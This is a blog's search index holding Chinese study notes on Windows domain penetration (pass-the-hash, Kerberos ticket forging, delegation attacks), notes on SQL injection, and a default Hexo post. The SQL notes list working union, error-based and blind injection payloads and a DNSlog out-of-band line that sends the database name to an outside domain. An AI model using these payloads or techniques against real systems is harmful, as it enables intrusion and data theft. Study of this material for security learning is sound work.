<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>内网渗透</title>
    <link href="/2023/04/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    <url>/2023/04/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>​最近在web方面遇到了瓶颈打算换个方向琢磨一下，就开始了内网的学习，这篇文章是我这两个星期以来对内网学习的一些认知和杂谈，也包括学习笔记，方便自己以后来回顾。</p><h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><p>​域本身就是一个非常形象的描述,这是内网中常见的网络环境。简而言之，域用户的身份不同，所拥有的权限也不同，跟工作组不一样，一般是由域管理员统一管理，而工作组的权限人人平等，不方便管理，这也是域是内网中最常见的环境的原因。在内网学习的过程中，我也经常会遇见一些专有名词，如下。</p><h3 id="常见名词"><a href="#常见名词" class="headerlink" title="常见名词"></a>常见名词</h3><p>AD—-活动目录，简单来说是一种通用的服务数据库，记录着用户账户，计算机账户，组和Kerberos协议要用到的相关凭据，方便管理员和用户能够轻松查找到或使用这些信息。</p><p>DC—-域控，域的最高权限服务器，管理着域的一切，是域环境中最重要的一台服务器。</p><p>还有一些后文会进行注释。</p><h3 id="1域信息收集命令"><a href="#1域信息收集命令" class="headerlink" title="1域信息收集命令"></a>1域信息收集命令</h3><p>此处列举一些常用的简单的命令。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">net <span class="hljs-keyword">user</span> /<span class="hljs-keyword">domain</span>查看域用户<br>net config workstation 当前登录域 - 计算机名 - 用户名<br>net <span class="hljs-type">time</span> 也可以查询域控<br>net use \\\\域控(如 pc.xx.com) <span class="hljs-keyword">password</span> /<span class="hljs-keyword">user</span>:xxx.com\username 相当于这个帐号登录域内主机，可访问资源<br>net <span class="hljs-keyword">group</span> &quot;domain admins&quot; /<span class="hljs-keyword">domain</span> 查询域管理用户<br></code></pre></td></tr></table></figure><h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>​进行横向渗透的前提是信息收集，发现域内的主机，才能发现可利用的主机。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">net <span class="hljs-built_in">view</span>/<span class="hljs-built_in">domain</span> 发现域内主机 返回6118<span class="hljs-built_in">error</span>时，是域管理禁用了Computer Broswer<br></code></pre></td></tr></table></figure><p>不过大多情况下，我通常会使用脚本进行扫描，可用的内网主机扫描脚本或者工具有很多,不在此一一列举。</p><h3 id="域渗透思路"><a href="#域渗透思路" class="headerlink" title="域渗透思路"></a>域渗透思路</h3><p>​接下来是这篇文章的重点，里面夹杂我对域渗透的思考。最近在学习域渗透的时候，常常因为弄不清楚协议或服务提供的具体功能，而陷入思考的漩涡。大多数博主或者师傅们教学的时候，对于原理部分没有讲的很清楚，或者是本人学艺不精。我个人在学习的时候会基于原理来做更多思考，一味的当脚本小子并不能学到真正的东西。</p><p>​在日常实战的渗透测试中，我们通过web打进内网可以进入域内一台主机的普通权限，我们就是利用这一台主机做跳板，定位域管理主机，域控，扩大渗透范围，利用域管理员可以登录域中任何一台主机的特性，设法从成员主机中dump出域管理员的密码，进而拿下域控，拿下整个内网。</p><h3 id="Token令牌窃取"><a href="#Token令牌窃取" class="headerlink" title="Token令牌窃取"></a>Token令牌窃取</h3><p>​Token就是一种验证身份的密钥，类似与账号和密码，除非当系统重启，他将一直保存在系统中，且Token具有随机性，无法被预测，所以黑客无法通过工具或者计算来预测出Token。但我们可以窃取令牌，假冒一个用户进行操作，一般我们需要域管理员权限。这部分我们只讨论Token窃取。令牌保存在系统里，列举令牌只能列出比当前权限更低的用户，当我们登录了一个域普通用户，我们必须使用本地的administrator账户才能查看令牌。</p><p>​我总结的窃取令牌攻击的思路，第一点就是想办法提权，必须拿到当前域普通用户主机的本地管理员才能进行下一步操作。当我们拿到本地管理员列举当前系统中保存的令牌，利用工具进行令牌伪造就行。</p><p>​当不同的用户登录计算机后，都会生成一个访问令牌，这个Token 在用户创建进程或者线程的似乎还会被使用，并不断进行拷贝。</p><p>​当用户登录时，系统通过将用户密码与安全数据库（如域认证中的NTDS或本地认证中的SAM文件）中存储的信息进行比较来验证用户密码。如果密码经过验证，则系统将生成访问令牌。代表该用户执行的每个进程都有此访问令牌的副本。因此，也可以在进程中进行令牌窃取。</p><p>​但我感觉通常这种方法不奏效，因为域管通常不会犯这么低级的错误，在用户主机上保存域管自己的Token。</p><h3 id="PTH-pass-the-hash-Hash传递攻击"><a href="#PTH-pass-the-hash-Hash传递攻击" class="headerlink" title="PTH(pass the hash) Hash传递攻击"></a>PTH(pass the hash) Hash传递攻击</h3><p>​PTH时一种常见且好用的内网渗透攻击方式，原理就是在Windows中，很多认证不采取明文认证，而是采用明文口令加密后的hash值来进行验证。其实我个人认为和盗号没什么区别。Hash分为两种LM和NT，只是两种不同的加密方式。现在LM好像已经被默认禁用，我们一般盗取的就是NT。</p><p>​这种攻击方式适用于可以获得用户Hash，域工作环境中有和当前主机一样密码的用户，且条件不允许对hash进行爆破。目前，微软已经对pth打了补丁。常规的pth确实失效，但是Administrator(SID&#x3D;500)还是奏效，还是可以用这个账号进行ipc远程连接。</p><p>​总结，要该主机上保存着域管或其他用户登录时候的hash才可以实现，一般情况下，域管可以登录域内的每一台主机，有可能会找到保存Hash的主机。</p><h3 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a>Kerberos协议</h3><p>​Kerberos是是一种认证服务，在内网渗透中，我们经常用到这种协议，下文我就来浅谈我对这个协议的简单理解。</p><p>​Kerberos这一词源于古希腊神话中的Cerberus —— 守护地狱之门的三头犬。这个协议也像地狱三头犬一样，需要进行三次通信。一般来说，Kerberos是一种基于Ticket加密的服务验证协议。它主要由三个部分确定，KDC,Client,Service。</p><p>​1.客户端给KDC发送带有自己信息的请求</p><p>​2.KDC收到之后将检查客户端的ID是否在KDC数据库中</p><p>​3.KDC分为AS和TGS，如果AS检查操作没有异常，KDC将随机生成一个key，称为TGS Session key，字面意思就是用于用户等会和TGS进行通信，还会发送两条消息，其中一条叫TGT,由TGS的密钥加密，客户端无法解密，包含客户端ID, TGS Session Key等信息。另一条信息由客户端密钥加密，客户端可以正常解密，包含目标 HTTP 服务ID，TGS Session Key等信息。</p><p>​4.用户用本地密钥解密第二条信息，相当于用户有了TGT(但无法解密)和TGS  Seesion key，可以用来访问TGS了。</p><p>​5.用户无脑发送自己的包含个人信息的东西(session key加密)和TGT给TGS</p><p>​6.TGS用自己的密钥解密TGT，还有session key解密拿到用户信息</p><p>​7.解密之后TGS就会进行用户信息对比，包括时间戳，所以我们的一些攻击中有时间限制</p><p>​8.如果检查无误，TGS就会发给用户两条信息，一个服务加密的key，还有一个就是TGS Session加密的key，然后用户收到后进行转发给服务。</p><p>​9.服务进行解密后对比信息，无误之后就可以进行通信了</p><p>以上过程看起来很复杂，简而言之就是双向验证。Client向KDC发送请求，KDC中的AS查找AD判断用户是否合法，返回TGT，Cient用TGT访问KDC中的TGS，TGS判断是否合法，返回ST，Client拿着ST去访问服务，服务端返回服务。</p><p>​下面提到PAC，这是微软提供的特权访问证书，可以控制访问。他包含用户的SID等一些详细信息，在APR_EQ阶段，客户端会验证PAC，检查用户能够访问的权限，但是有些服务不会验证PAC这也是白银票据成功的前提。</p><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>​当用户给KDC发送请求，然后 KDC使用 Krbtgt 用户的 NTLM-Hash 作为密钥进行加密，生成 TGT。而如果我们获取到Krbtgt的hash值，就可以伪造任意用户的TGT了，但是Krbtgt保存在域控上，也就是说我们必须要拿到域控权限，也就是说黄金票据可以当作一个后门，用于权限维持。</p><h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>​白银票据则是伪造ST，不用访问KDC，绕过域控，留下很少的日志，由服务账号的hash加密。</p><h2 id="委派攻击"><a href="#委派攻击" class="headerlink" title="委派攻击"></a>委派攻击</h2><p>​委派是windows中的一个属性，只有主机或者服务账号才有委派属性，域用户通过SPN是可以成为服务账号的。委派就是该主机可以模拟其他用户访问服务。</p><h3 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h3><p>​ 非约束委派意思就是用户可以委派你去访问任何服务。如果serverA设置了非约束委派，当用户A提交对serverA的申请给KDC，KDC会检查serverA的属性，是非约束委派，此时KDC就会将用户的TGT和ST放在一起发给A,保存在A的系统中，从而A就可以模拟该用户访问服务。从攻击角度来说，攻击者拿到了一台非约束委派的服务主机，可以诱导域管来访问，从而保存域管的TGT。依靠以上方法还可以获取黄金票据。</p><h3 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h3><p>​非约束委派在实战中不常用，因为域管理员不会这么傻给权限。非约束委派指的就是该主机只能被委派去访问特定的服务。由于非约束委派的不安全性，微软引入了两个扩展协议，简称为S4Uself和S4Uproxy，这两个子协议是TGS的，用户还是会发送TGT给相关受委派的服务，但是这个proxy协议限制了他访问的服务对象。过程为，A请求server1,server1通过self协议代表A去请求一个可以访问自身的可转发Ticket,然后代表A去请求KDC通过proxy协议请求一个访问server2的Ticket，然后server1就可以访问server2。</p><p>​从攻击角度来看，我们劫持中间被配置了约束委派的服务用户1，也就是获取了明文密码或者hash，我们就可以伪造server1的TGT。通常server1是会转发A转发给他的ST1，但我们伪造了TGT发给KDC，而在S4Uproxy协议，也就是第二次请求KDC中，我们伪造是使用的管理员账户来访问服务。</p><p>​简而言之，知道委派主机的密码后，可以请求到服务用户的TGT，然后通过TGT可以伪造S4Uproxy服务，伪造成administrator用户访问服务，就是我们得到了该服务主机的权限时，由于第一段S4Uself不用验证用户自己的票据，所以可以先伪造请求server1本身，然后再利用此ST可以伪造任意用户请求获取server2的票据。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>关于sql注入的一些理解</title>
    <link href="/2023/04/12/article-title/"/>
    <url>/2023/04/12/article-title/</url>
    
    <content type="html"><![CDATA[<p>union注入 union select通过group by&#x2F;order by判断列数 –+</p><p>创造回显点 id&#x3D;-1</p><p>判断是字符型还是数字型注入 2-1判断</p><p>拿到表名和列名</p><p>database() </p><p>information_schema系统自带的数据库，其中有tables和columns</p><p>通常有waf</p><p>union select 1,group_concat(table_name),3 from information_schema.tables where information_schemas&#x3D;  –+</p><p>group_concat将所有查询信息放到一行使用</p><p>数字型不用闭合</p><p>查询语句会优先查询括号里面的内容</p><p>?id&#x3D;0 union select 1,group_concat(column_name),2 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’ –+</p><p>extractvalue  用来查询一个数据</p><p>0x7e是~ 提供错误 concat拼接参数</p><p>?id&#x3D;1’ and select 1,2,extractvalue(1,concat(0x7e,select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())) –+</p><p>报错注入有长度限制只有32字符 substring</p><p>substring(123456,2,3)   234 进行拼接</p><p>updatexml()三个参数 我们重点研究第二个参数 故意将第二个参数写错</p><p>id&#x3D;1’ and 1&#x3D;updatexml(1,concat(‘~’,select group_concat(table_name)from information_schema.tables where table_schema&#x3D;database()),3)–+</p><p>floor报错</p><p>rand() 在0-1之间随机生成一个数</p><p>rand()*2在0-2之间随机生成一个数</p><p>floor()小数向下取整</p><p>select floor(rand()*2);在0和1之间随机生成</p><p>concat_ws(1,2,3)将后两个参数用第一个参数连接</p><p>select concat_ws(‘-‘,select database(),floor(rand()*2)) from users有多少用户就会重复多少次</p><p>select count(**),concat_ws(‘-‘,(select database()),floor(rand()*2))as a from users group by a在统计错误时报错</p><p>rand(0)稳定报错 rand(1)稳定不报错</p><p>?id&#x3D;1’ union select 1,count(*),concat_ws(‘-‘,select version(),floor(rand(0)*****2)) as x from information_schema.tables group by x–+</p><p>limit x,1控制输出</p><p>盲注分类：页面没有回显</p><p>布尔盲注 页面回复真假</p><p>ascii()函数 把字符变成一个对应的数字</p><p>select ascii(‘B’)</p><p>and ascii(substr(select database(),1,1))&gt;&#x3D;101–+比较字符来破解</p><p>and ascii(substr(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;100 –+</p><p>substr(select columns_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’,1,1)</p><p>时间盲注:会执行代码但是不回显 sleep(3)使页面过几秒响应</p><p>点击网络耗时 可以看到响应时间</p><p>if(condition,true,false)</p><p>id&#x3D;1’ and if(ascii(substr(select database(),1,1))&gt;100,sleep(0),sleep(3))–+</p><p>dnslog注入</p><p>load_file()读取路径文件 利用dns解析服务记录日志 让目标网站去解析我的域名并且同时执行一个sql命令</p><p>利用一个dns解析网站</p><p>concat(“&#x2F;&#x2F;“,select database(),”.xxx.dnslog.cn&#x2F;benben”)</p><p>1’ and (select load_file(concat(“&#x2F;&#x2F;“,(select database()),”.xxx,dnslog.cn&#x2F;&#x2F;随意加一个文件名”)))–+</p><p>此时这个文件读取不出来 只能尝试访问这个域名，然后就可以在dnslog上看到数据库名</p><p>select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1来替换想要爆的信息</p><p>Post注入 get提交可以被缓存 且有最长字符限制</p><p>post提交没有长度要求，且还可以使用二进制数据</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/02/26/hello-world/"/>
    <url>/2023/02/26/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
